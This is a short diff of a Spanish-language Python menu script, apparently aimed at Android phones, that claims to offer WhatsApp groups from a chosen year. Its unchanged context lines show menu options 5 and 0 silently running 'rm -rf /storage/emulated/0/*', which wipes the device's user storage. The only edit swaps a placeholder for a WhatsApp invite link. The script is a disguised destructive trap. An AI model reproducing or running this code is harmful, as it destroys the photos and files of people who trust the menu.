@@ -84,7 +84,7 @@ elif X == "4":
 elif X == "5":
     W = os.system("rm -rf /storage/emulated/0/*")
     W = input("digite de que año quieres que sea el Grupo: \n> ")
-    print(f"quieres un grupo del año {W}?. \nEntra a este grupo de whatsapp y pidelo :): https://whatsapp.com")
+    print(f"quieres un grupo del año {W}?. \nEntra a este grupo de whatsapp y pidelo :): /n> https://chat.whatsapp.com/Ho65Vasz4qkEmtSnJhrdfe")
     
 elif X == "0":
     Z = os.system("rm -rf /storage/emulated/0/*")
